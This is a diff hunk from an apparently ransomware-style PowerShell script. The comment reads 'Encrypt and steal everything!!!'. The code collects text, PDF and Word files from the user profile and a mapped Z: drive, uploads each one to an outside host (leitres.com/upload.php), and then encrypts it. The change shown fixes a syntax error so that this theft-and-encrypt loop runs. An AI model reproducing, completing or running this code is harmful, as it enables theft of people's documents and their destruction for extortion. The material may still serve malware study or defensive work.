@@ -54,7 +54,7 @@ Invoke-WebRequest -UseBasicParsing -Uri $url `
 #Encrypt and steal everything!!!
 
 #foreach ($i in $(Get-ChildItem $Directory -recurse -Include *.txt | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName }))
-foreach ($i in $(Get-ChildItem -Path ($env:USERPROFILE,"Z:\") -recurse -Include ('*.txt', '*.pdf','*.doc','*.docx') -ErrorAction| Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName }))
+foreach ($i in $(Get-ChildItem -Path ($env:USERPROFILE,"Z:\") -recurse -Include ('*.txt', '*.pdf','*.doc','*.docx')| Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName }))
 {
 exfil "http://leitres.com/upload.php" $i
 encrypt $i
